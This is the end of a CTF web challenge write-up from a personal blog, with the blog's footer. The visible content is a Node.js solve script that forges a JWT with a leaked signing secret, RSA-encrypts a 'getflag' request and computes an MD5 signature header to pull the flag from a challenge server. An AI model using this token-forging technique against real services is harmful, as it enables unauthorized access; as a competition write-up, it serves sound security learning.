<span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> pubKey = <span class="string">`-----BEGIN PUBLIC KEY-----</span></span><br><span class="line"><span class="string">MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA6HXr1LSOx2q97lSv0p7z</span></span><br><span class="line"><span class="string">hqtgy/JwwWntE73TDKGMSx6Z5lRsDuVjBhuGPI050VkhtIgbAppM4xtsNhwkGfOK</span></span><br><span class="line"><span class="string">s4OSt7PzHVyglkgwX7X04qFZKNOYYDS6Um+gZb5XXwiQ8GcFqfEjbKbLjvegUWur</span></span><br><span class="line"><span class="string">H4sv3OpSIJOiTkhMZqCkfOTUxLF1+mwFDJVt5COQB/frFps/U5+OspjMGAVgORbn</span></span><br><span class="line"><span class="string">99Uuy9KZsGQwX2e+NvvIAtLNaW1lycP0XTQiXnhm+k1+g8MGS01TpUZtwuBrDUAw</span></span><br><span class="line"><span class="string">K/iNbCGQdKQ77J/dEO3YGYHKED2WKmApDGA0lNWou768D0dCHxOwUUwGIQw/CC1s</span></span><br><span class="line"><span class="string">TwIDAQAB</span></span><br><span class="line"><span class="string">-----END PUBLIC KEY-----`</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">sign</span> = (<span class="params">data = &#123;&#125;</span>) =&gt; jwt.<span class="title function_">sign</span>(data, <span class="string">`wCvO3WRz9*vNM%rMaApkerY^^jI6vXmh`</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> url = <span class="string">&quot;http://web-a9e5aece41.challenge.xctf.org.cn&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> path = <span class="string">&quot;/api/v1/getflag&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> r24 = [<span class="string">&quot;9d5ec98c-5848-4450-9e58-9f97b6b3b7bc&quot;</span>];</span><br><span class="line"></span><br><span class="line">(<span class="title function_">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> item <span class="keyword">of</span> r24) &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">const</span> rawPayload = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; <span class="attr">action</span>: <span class="string">&quot;getflag&quot;</span> &#125;);</span><br><span class="line">        <span class="keyword">const</span> encrypted = crypto.<span class="title function_">publicEncrypt</span>(&#123;</span><br><span class="line">            <span class="attr">key</span>: pubKey,</span><br><span class="line">            <span class="attr">padding</span>: crypto.<span class="property">constants</span>.<span class="property">RSA_PKCS1_PADDING</span></span><br><span class="line">        &#125;, <span class="title class_">Buffer</span>.<span class="title function_">from</span>(rawPayload));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> payload = encrypted.<span class="title function_">toString</span>(<span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// token</span></span><br><span class="line">        <span class="keyword">const</span> token = <span class="title function_">sign</span>(&#123;</span><br><span class="line">            <span class="attr">sub</span>: <span class="string">&quot;1234567890&quot;</span>,</span><br><span class="line">            <span class="attr">uid</span>: item,</span><br><span class="line">            <span class="attr">iat</span>: <span class="number">1516239022</span></span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> dataStr = <span class="string">`&#123;&quot;data&quot;:&quot;<span class="subst">$&#123;payload&#125;</span>&quot;&#125;`</span>;</span><br><span class="line">        <span class="keyword">const</span> signX = <span class="title class_">CryptoJS</span>.<span class="title class_">MD5</span>(dataStr).<span class="title function_">toString</span>();</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;token:&quot;</span>, token);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;X-Sign:&quot;</span>, signX);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> response = <span class="keyword">await</span> axios.<span class="title function_">post</span>(url + path, &#123; <span class="attr">data</span>: payload &#125;, &#123;</span><br><span class="line">                <span class="attr">headers</span>: &#123;</span><br><span class="line">                    <span class="title class_">Authorization</span>: token,</span><br><span class="line">                    <span class="string">&#x27;X-Sign&#x27;</span>: signX</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Response:&quot;</span>, response.<span class="property">data</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;请求出错:&quot;</span>, error.<span class="property">response</span>?.<span class="property">data</span> || error.<span class="property">message</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>

<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202603021639136.png" alt="img"></p>

  </div>

  
  <div class="about">
    <h1>About this Post</h1>
    <div class="details">
      <p>This post is written by p0l1st, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
    </div>
    
    <p class="tags">
      <i class="bi bi-tags icon"></i>
      
      <a href="/tags/CTF/" class="tag">#CTF</a>
      
    </p>
    
  </div>
  

  <div class="container post-prev-next">
    
    <a href="/2025/08/07/2025%E7%A3%90%E7%9F%B3%E5%88%9D%E8%B5%9BWeb%E4%B8%A4%E9%81%93Java/" class="next">
      <div class="text">
        <p class="label">Next</p>
        <h3 class="title">2025磐石初赛Web两道Java</h3>
      </div>
    </a>
    
    
    <a href="/2025/06/02/D-3CTF2025-jtar-%E5%A4%8D%E7%8E%B0/" class="prev">
      <div class="text">
        <p class="label">Previous</p>
        <h3 class="title">D^3CTF2025 jtar(复现)</h3>
      </div>
    </a>
    
  </div>

  
    
    
  
</article>


    </main>
    <footer>
  <div class="inner">
    <div class="links">
      
      <div class="group">
        <h2 class="title">Blog</h2>
        
        <a href="/" class="item">Home</a>
        
        <a href="/archives" class="item">Archives</a>
        
        <a href="/tags" class="item">Tags</a>
        
        <a href="/categories" class="item">Categories</a>
        
        <a href="/search" class="item">Search</a>
        
        <a href="/friends" class="item">Friends</a>
        
        <a href="/about" class="item">About</a>
        
      </div>
      
      <div class="group">
        <h2 class="title">Me</h2>
        
        <a target="_blank" rel="noopener" href="https://github.com/p0l1st" class="item">GitHub</a>
        
        <a target="_blank" rel="noopener" href="https://yuque.com/p0l1st" class="item">语雀</a>
        
      </div>
      
    </div>
    <span>&copy; 2026 p0l1st<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></span>
    
    
      <br>
      <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
        <label>
          <input type="radio" value="light">
          <span>Light</span>
        </label>
        <label>
          <input type="radio" value="dark">
          <span>Dark</span>
        </label>
        <label>
          <input type="radio" value="auto">
          <span>Auto</span>
        </label>
      </div>
    
  </div>
</footer>


    
<script src="/js/main.js"></script>


    

    
    
<script src="/js/scroll-reveal.js"></script>

    

    

    

    
  </body>
</html>
